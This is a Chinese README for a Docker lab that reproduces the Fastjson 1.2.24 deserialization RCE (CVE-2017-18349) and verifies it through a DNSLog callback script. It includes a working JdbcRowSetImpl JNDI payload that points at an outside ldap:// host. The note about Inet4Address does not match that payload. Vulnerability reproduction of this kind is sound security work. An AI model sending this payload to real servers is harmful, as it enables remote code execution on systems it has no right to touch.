# Fastjson 1.2.24 (CVE-2017-18349) 漏洞复现环境

本项目用于复现 Fastjson 1.2.24 远程代码执行（RCE）漏洞，包含漏洞环境和自动化 DNSLog 验证脚本。

## 目录
1. [漏洞概述](#漏洞概述)
2. [漏洞原理](#漏洞原理)
3. [受影响版本](#受影响版本)
4. [漏洞危害](#漏洞危害)
5. [环境搭建](#环境搭建)
6. [自动化验证流程](#自动化验证流程)
7. [常见问题排查](#常见问题排查)
8. [清理环境](#清理环境)

## 漏洞概述
Fastjson 1.2.24 版本中，`autotype` 功能默认开启，这允许用户在反序列化 JSON 字符串时指定实例化任意类。攻击者可以通过构造特殊的 JSON Payload，使其在反序列化过程中调用特定类的恶意方法（例如 JNDI 注入、执行系统命令等），从而导致远程代码执行（RCE）。

## 漏洞原理
核心在于 `@type` 字段，该字段用于指定反序列化时的类名。当 Fastjson 解析包含 `@type` 的 JSON 字符串时，它会尝试加载并实例化该类，并调用对应的 setter或getter方法。由于 1.2.24 并没有对可实例化的类进行严格的黑白名单限制，导致了安全隐患。使用诸如 `com.sun.rowset.JdbcRowSetImpl` 等利用链，就可以触发 JNDI 注入实现 RCE。本环境为简单验证漏洞存在，使用 `java.net.Inet4Address` 触发 DNS 请求解析。

## 受影响版本
*   Fastjson <= 1.2.24

## 漏洞危害
*   **远程代码执行 (RCE)**：攻击者可以构造恶意 JSON，执行任意系统命令，获取服务器最高权限。

## 环境搭建
本项目使用 Docker Compose 搭建，包含 Fastjson 1.2.24 漏洞环境、DNSLog 服务和客户端工具。

### 1. 前置检查
确认 Docker Engine 已启动：
```bash
docker info
```

### 2. 构建并启动
在项目根目录执行：
```bash
docker compose up -d --build
```

### 3. 服务说明
*   **Fastjson 漏洞靶场**: `http://localhost:8090` (基于 `vulhub/fastjson:1.2.24`)
*   **DNSLog 服务**: `http://localhost:8081` (用于接收 DNS 请求日志)
*   **PoC 容器**: `poc-client`（备用客户端容器）

## 自动化验证流程

我们提供了一个 bash 脚本来自动化触发和验证漏洞。

### 执行自动化脚本
```bash
./test_poc.sh
```

### 脚本执行流程及预期输出
1. 脚本会生成一个形如 `fastjson-xxxxxxxx.log.rcs-team.com` 的随机域名。
2. 发送如下 Payload 到 `http://localhost:8090`：
   ```json
   {"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<随机域名>/a","autoCommit":true}}
   ```
3. 等待 3 秒钟后，请求本地 DNSLog 服务。
4. 预期会在输出中看到：`[+] SUCCESS: Vulnerability verified! Found DNSLog record for: ...`。

### 手动浏览器查看 DNSLog 记录：
* 打开 `http://localhost:8081`
* 检查是否出现该验证记录。

## 常见问题排查

### DNSLog 无记录
按顺序检查：
1. `docker compose ps` 确认 `fastjson-server` 和 `dnslog-server` 正常运行。
2. 确认 `fastjson-server` 配置了 `dns: 172.31.0.53` 且网络连通。

## 清理环境
测试完成后关闭并清理容器：
```bash
docker compose down
```
